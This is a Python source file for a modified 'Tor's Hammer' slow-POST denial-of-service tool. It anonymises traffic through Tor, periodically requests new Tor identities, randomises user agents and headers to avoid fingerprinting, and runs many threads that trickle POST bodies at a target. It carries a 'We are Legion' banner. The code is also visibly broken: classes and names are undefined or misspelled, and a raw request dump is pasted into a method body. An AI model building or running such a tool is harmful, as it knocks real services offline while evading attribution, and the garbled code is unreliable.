#!/usr/bin/python
# -*- coding: utf-8 -*-

from asyncio.proactor_events import _ProactorBaseWritePipeTransport
import sys

from multiprocessing import Process, Manager
import socks
import ssl
import argparse
import string
from urllib.parse import urlparse
import random
import logging
from time import sleep
from colors import Colors


LOGLEVEL    = logging.DEBUG


# Constants
USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [ 'Linux x86_64', 'Linux i386' ],
            'ext': [ 'X11' ]
        },
        'windows': {
            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
            'ext': [ 'WOW64', 'Win64; x64' ]
        },
        'mac': {
            'name': [ 'Macintosh' ],
            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
        },
    },
    'platform': {
        'webkit': {
            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
            'details': [ 'KHTML, like Gecko' ],
            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
        },
        'iexplorer': {
            'browser_info': {
                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
                'ext_pre': [ 'compatible', 'Windows; U' ],
                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
            }
        },
        'gecko': {
            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
            'details': [],
            'extensions': []
        }
    }
}


class SockWrapper(object):


    def __init__(self, host, port, use_ssl=False, tor_ip=None, tor_port=None):

        self.host = host
        self.port = port
        self.use_ssl = use_ssl

        self.tor_ip = tor_ip
        self.tor_port = tor_port
        self.use_tor = True if tor_ip is not None and tor_port is not None else False

        self.connected = False
        self.socket = None
        self.ssl = None


    def connect(self, ) -> bool:

        self.disconnect()

        try:
            self.socket = socks.socksocket()
            if self.use_tor:
                self.socket.setproxy(socks.PROXY_TYPE_SOCKS5, self.tor_ip, self.tor_port)

            self.socket.connect((self.host, self.port))

            if self.use_ssl:
                self.ssl = ssl.wrap_socket(self.socket)

            self.connected = True

        except OSError as e:
            self.connected = False
            raise e

        return self.connected


    def disconnect(self, ):
        
        if self.ssl is not None:
            self.ssl.shutdown()
            self.ssl.close()
            self.ssl = None

        if self.socket is not None:
            self.socket.shutdown()
            self.socket.close()
            self.socket = None

        self.connected = False


    def build_block(self, ) -> string:
        
        msg = ''
        for _ in range(random.randint(1, 3)):
            msg += chr(random.choice(string.ascii_letters + string.digits))

        return msg


    def generate_query_string(self, ammount = 1) -> str:

        queryString = []

        for i in range(ammount):

            key = self.build_block(random.randint(3,10))
            value = self.build_block(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)


    def generate_data(self) -> tuple[str, str]:

        param_joiner = "?"
        url = self.args.target

        if len(url) == 0: url = '/'
        if url.count("?") > 0: param_joiner = "&"

        request_url = self.generate_request_url(param_joiner)
        http_headers = self.generate_random_headers()

        return (request_url, http_headers)

    
    def generate_request_url(self, param_joiner = '?'):
        return self.argc.target + param_joiner + self.generate_query_string(random.randint(1,5))


    def generate_user_agent(self):

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
        os_name = random.choice(os['name']) 
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))


        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))

        return ua_string


    def generate_random_headers(self):

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1,len(acceptEncoding)/2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self.generate_user_agent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1,1000),
            'Host': self.host,
        }
    
        # Randomly-added headers
        # These headers are optional and are 
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(random.randint(5,10))

            random_referer = random.choice(self.referers) + url_part
            
            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers


    def create_payload(self) -> tuple[str, str]:

        req_url, headers = self.generateData()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)


    def _prepare_msg(self, ) -> str:

        

        GET
/?xwhIcXx=54eVAl1tcOEg67A2&gxrG=8qI3jB0ehktJ3itV7P5G&DKCAtsgGpk=0jc3j0TQvE&7EO=BxM75u
{'Accept-Encoding': 'gzip', 'Keep-Alive': 547, 'Host': 'google.com', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_0) Gecko/20021804 Firefox/14.0', 'Accept-Charset': 'ISO-8859-1,Windows-1251;q=0.9,*;q=0.6', 'Connection': 'keep-alive', 'Referer': 'http://www.yandex.com/27tKMnFE?a7YFXgt7i=i48hibLoADsv&IYblxVoraC=WGHyNJof6BKB&vPBw5=Bur&umqR55EQ=C2UfXn&NXAU=M85mvTe5nM1EslRVL', 'Cache-Control': 'max-age=0', 'Content-Type': 'multipart/form-data'}


        return ''


    def send(self, ) -> bool:

        referers = [ 
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://www.yahoo.com/',
            'http://www.globo.com/',
            'http://www.pastebin.com/',
            'https://www.nasa.gov/',
            'https://www.facebook.com/',
            'http://www.chris.com/',
            'http://www.retrojunkie.com/',
            'http://www.usatoday.com/',
            'http://www.engadget.search.aol.com/',
            'http://www.ask.com/',
            'http://www.sogou.com/',
            'http://www.zhongsou.com/',
            'http://www.dmoz.org/',
            'http://' + self.args.target + '/'
            'https://' + self.args.tsrget + '/'
            ]
        
        if not self.conected:
            self.connect()

        if self.connected:
            (url, headers) = self.createPayload()
            method = random.choice(['get', 'post']) if self.argc.method == 'rand' else self.argc.method

            # conn_req.request(method.upper(), url, None, headers)
         

            if self.use_ssl:
                self.ssl.sendall()
            else:
                self.socket.sendall(msg.encode('utf-8'))

            return True

        return False


class HIMARS(Process):


    def __init__(self, args: argparse.Namespace):

        super(HIMARS, self).__init__()
        self.args = args
        self.socks: SockWrapper = []

        


    def __del__(self):
        self.stop()


    




    def open_socks(self, ):

        for _ in range(self.args.sockets):
            s = SockWrapper(self.args.host, self.args.port, self.args.ssl, self.args.tor_ip, self.args.tor_port)

            try:
                if s.Connect():
                    logging.debug(f"Thread: {self.name}. Connected to host.")
                    self.socks.append(s)

            except OSError as e:
                # error codes: https://gist.github.com/gabrielfalcao/4216897
                logging.error(f"Thread: {self.name}. Error connecting to host: {e}")

            

    def send(self, ) -> bool:
    
        if not self.connected:
            self.connect()

        if self.connected:
        
            try:
                self.socks.send(msg.encode('utf-8'))
                logging.debug(f"Thread: {self.name} Sent: {msg}")
                return True

            except OSError as e:
                self.conected = False
                logging.error(f"Thread: {self.name}. Error while sending message: {e}")
        
        return False        


class Reauthenticate(HttpPost):


    def __init__(self, args: argparse.Namespace, stop: Event):

        HttpPost.__init__(self, args)
        self.stop = stop
        self.password = args.tor_password
        self.name = 'R'
        self.timeout = 6


    def run(self):

        while not self.stop.is_set():

            for _ in range(10):
                sleep(self.timeout)
                if self.stop.is_set():
                    break

            #check again
            if not self.stop.is_set(): 
                logging.debug(f'Thread: {self.name}. Reauthenticating on tor.')
                self.send_http_post(f'AUTHENTICATE "{self.password}"\r\nSIGNAL NEWNYM\r\n')
            else: break


class DoS(HttpPost):

    def __init__(self, args: argparse.Namespace, stop: Event):

        HttpPost.__init__(self, args)
        self.stop = stop


    def send(self, ):

        msg = f"POST / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(uagents.user_agents)}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
        if not self.send_http_post(msg):
            return

        for i in range(9999):
            if self.stop.is_set(): return

            msg = random.choice(string.ascii_letters + string.digits)
            if not self.send_http_post(msg): return

            sleep(random.uniform(0.1, 3))

        return


    def run(self, ):
        while not self.stop.is_set():
            self.send()


def main(argv):
   
    parser = argparse.ArgumentParser(description='This script is a modified torshammer script with few additional functionalities taken from blackhorizon.')
    parser.add_argument('-t', '--target', help='IP or URL address and port of the target.', type=ascii, required=True)
    parser.add_argument('-s', '--sockets', help='Number of sockets per thread, default=1.', default=1, type=int)
    parser.add_argument('-m', '--method', help='Method to be used, default=POST.', choices=['POST', 'GET', 'RAND'], default='POST')

    sub_parsers = parser.add_subparsers(help='TOR options')
    tor_parser = sub_parsers.add_parser('tor', help='Use tor.')
    tor_parser.add_argument('-r', '--tor-address', help='TOR ip address and port, default:127.0.0.1:9050', default='127.0.0.1:9050', type=ascii)
    tor_parser.add_argument('-w', '--tor-password', help='TOR service pasword', required=True, type=ascii)
    
    args = parser.parse_args(argv)
    presult = urlparse(args.target)
    args.ssl = presult.scheme == 'https'
    netloc = presult.netloc.split(':')[0]
    args.target = netloc[0]

    try:
        args.port = netloc[1] if len(netloc) > 1 else 80
    except:
        logging.error('Error, wrong target\'s url format. Port can not be casted to int.')
        sys.exit()

    args.path = presult.path
    args.params = presult.params
    args.query = presult.query
    args.method = args.method.lower()
    args.use_tor = False

    if hasattr(args, 'tor_ip'):
        args.use_tor = True
        presult = urlparse(args.tor_address)
        args.tor_ip = presult.netloc.split(':')[0]

        try:
            args.tor_port = netloc[1] if len(netloc) > 1 else 9050
        except:
            logging.error('Error, wrong tor\'s address format. Port can not be casted to int.')
            sys.exit()

        args.tor_password = args.tor_password.replace('\'','')

    Colors.info(f"Target: {args.host}:{args.port} SSL: {args.ssl} TOR: {args.tor_ip}:{args.tor_port}")
    Colors.info(f"Threads: {args.threads} Sockets per thread: {args.sockets} Method: {args.method}")
    Colors.warn("Give 20 seconds without tor or 40 seconds before checking site.")
    _ = input('Press any key to start.')

    stop = Event()

    rthreads = []
    for i in range(args.threads):
        t = DoS(args, stop=stop)
        rthreads.append(t)
        t.start()

    if args.use_tor:
        t = Reauthenticate(args, stop=stop)
        rthreads.append(t)
        t.start()

    logging.debug('Threads created')

    try:
        rthreads = [t.join(1) for t in rthreads if t is not None and t.is_alive()]
        sleep(0.1)
  
    except:
        stop.set()
        logging.info(f"Shutting down threads. Please wait until done.")

        # while active_count() > 1:
        #     print(f'\rActive threads: {active_count()} / {len(rthreads)}   ', end="")
        #     sleep(0.1)

        print(f'\rActive threads: 0 / {len(rthreads)}                       ')

        sys.exit(0)


if __name__ == "__main__":

    logging.basicConfig(
        level=LOGLEVEL,
        format='%(asctime)s - %(name)s - \033[38;5;209m%(levelname)s\033[0m - %(message)s',
    #   filename='output.txt'
    )
    
    Colors.info("Modified Tor's Hammer ")
    Colors.info("Slow POST DoS Testing Tool")
    Colors.info("Anon-ymized via Tor")
    Colors.info("We are Legion.")
    Colors.info("") 

    main(sys.argv[1:])
    
